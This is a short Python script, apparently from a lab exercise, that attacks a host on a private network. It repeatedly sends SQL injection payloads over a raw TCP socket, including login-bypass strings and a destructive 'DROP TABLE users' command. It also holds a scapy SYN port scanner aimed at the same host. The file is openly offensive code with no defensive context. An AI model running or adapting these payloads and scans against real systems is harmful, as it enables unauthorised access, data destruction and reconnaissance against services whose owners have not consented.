import socket
from scapy.all import *

def client(strings):

    HOST = "192.168.14.17"
    PORT = 10000
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    print sock.recv(2048)
    for i in xrange(25):
        for string in strings:
            sock.send(string)
            print "SENDED!"
    sock.close()


def portscanner():
    for port in xrange(10000, 10021):
            ip = IP(src="192.168.14.174",dst="192.168.14.17")
            s=TCP(sport=27015, dport=port, flags='S', seq=1000)
            send(ip/s)
    print "done scanning"


def main():
    SQL_INJECTION_PATTERNS = ["\' OR \'1\'=\'1",
							  "\' OR \'1\'=\'1\' --",
							  "1;DROP TABLE users"]
    client(SQL_INJECTION_PATTERNS)
    #portscanner()


if __name__ == '__main__':
    main()